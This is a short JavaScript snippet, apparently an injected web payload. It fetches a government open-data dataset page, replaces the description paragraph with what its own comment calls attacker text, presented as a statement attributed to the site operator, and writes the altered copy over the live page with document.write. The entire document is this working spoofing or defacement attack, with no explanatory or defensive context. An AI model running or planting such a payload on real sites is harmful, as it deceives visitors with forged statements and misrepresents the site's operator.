(async () => {
  const html = await (await fetch("https://data.example.gov/dataset/11403-open-data-example")).text();
  const doc = new DOMParser().parseFromString(html, 'text/html');

  // replace the description paragraph in the clean copy with attacker text
  doc.querySelector('#description')
  .closest('section')
  .querySelector('p').textContent = 'Attributed statement from the site operator';

  // render the altered copy over the live page
  document.open();
  document.write('<!DOCTYPE html>' + doc.documentElement.outerHTML);
  document.close();
})();
